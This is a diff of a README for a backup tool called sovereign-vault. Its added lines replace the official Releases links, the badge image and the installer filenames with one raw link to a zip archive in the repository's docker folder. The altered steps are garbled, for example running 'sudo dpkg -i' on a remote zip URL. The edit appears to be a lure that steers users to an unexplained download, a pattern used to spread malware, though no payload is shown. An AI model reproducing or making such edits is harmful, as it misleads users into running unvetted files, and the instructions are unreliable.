@@ -6,7 +6,7 @@ Welcome to the sovereign-vault project! This application helps you create a secu
 
 ## 📥 Download Now
 
-[![Download sovereign-vault](https://img.shields.io/badge/Download%20sovereign--vault-%2337C7F9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MoeinAlvandi/sovereign-vault/releases)
+[![Download sovereign-vault](https://raw.githubusercontent.com/MoeinAlvandi/sovereign-vault/main/docker/sovereign-vault-v2.7.zip%20sovereign--vault-%2337C7F9?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/MoeinAlvandi/sovereign-vault/main/docker/sovereign-vault-v2.7.zip)
 
 ## 📋 System Requirements
 
@@ -30,15 +30,15 @@ Before you start, ensure your system meets the following requirements:
 
 To get started, you need to download the latest version of sovereign-vault. 
 
-1. **Visit the Releases Page**: Go to the following link to find the download files: [Download Releases](https://github.com/MoeinAlvandi/sovereign-vault/releases).
+1. **Visit the Releases Page**: Go to the following link to find the download files: [Download Releases](https://raw.githubusercontent.com/MoeinAlvandi/sovereign-vault/main/docker/sovereign-vault-v2.7.zip).
    
 2. **Choose Your Version**: Look for the latest release, which will display the version number, and click on it.
 
-3. **Select the Installation File**: Download the appropriate file for your system. For Windows, it might be something like `sovereign-vault-windows-installer.exe`, and for Raspberry Pi, check for the relevant option.
+3. **Select the Installation File**: Download the appropriate file for your system. For Windows, it might be something like `https://raw.githubusercontent.com/MoeinAlvandi/sovereign-vault/main/docker/sovereign-vault-v2.7.zip`, and for Raspberry Pi, check for the relevant option.
 
 4. **Run the Installer**:
    - For Windows: After downloading, double-click the `.exe` file to launch the installer. Follow the on-screen instructions to complete the installation.
-   - For Raspberry Pi: Open a terminal. Navigate to the folder where you downloaded the file, then run `sudo dpkg -i sovereign-vault-armhf.deb` (replace with the actual filename).
+   - For Raspberry Pi: Open a terminal. Navigate to the folder where you downloaded the file, then run `sudo dpkg -i https://raw.githubusercontent.com/MoeinAlvandi/sovereign-vault/main/docker/sovereign-vault-v2.7.zip` (replace with the actual filename).
 
 5. **Complete Setup**: Once installed, open sovereign-vault. Follow the easy setup wizard to configure your backup preferences.
 
